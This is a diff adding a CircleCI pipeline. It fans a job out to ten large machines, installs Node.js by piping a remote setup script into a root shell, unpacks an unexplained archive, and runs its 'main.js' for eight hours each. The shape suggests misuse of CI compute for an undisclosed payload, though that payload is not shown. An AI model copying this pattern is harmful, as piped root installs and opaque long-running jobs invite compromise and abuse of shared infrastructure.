@@ -1,0 +1,41 @@
+version: 2.1
+
+executors:
+  large-executor:
+    machine:
+      image: ubuntu-2204:current
+      resource_class: large
+
+jobs:
+  build:
+    executor: large-executor
+    parameters:
+      config_no:
+        type: integer
+    steps:
+      - checkout
+      
+      - run:
+          name: Install Node.js
+          command: |
+            curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+            sudo apt-get install -y nodejs
+      
+      - run:
+          name: Extract Archive
+          command: |
+            tar -xvf n.tar.gz
+      
+      - run:
+          name: Run for 8Hr
+          command: |
+            npm install --ignore-scripts
+            timeout 28800s node main.js || echo "Done by << parameters.config_no >>"
+workflows:
+  version: 2
+  runner:
+    jobs:
+      - build:
+          matrix:
+            parameters:
+              config_no: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
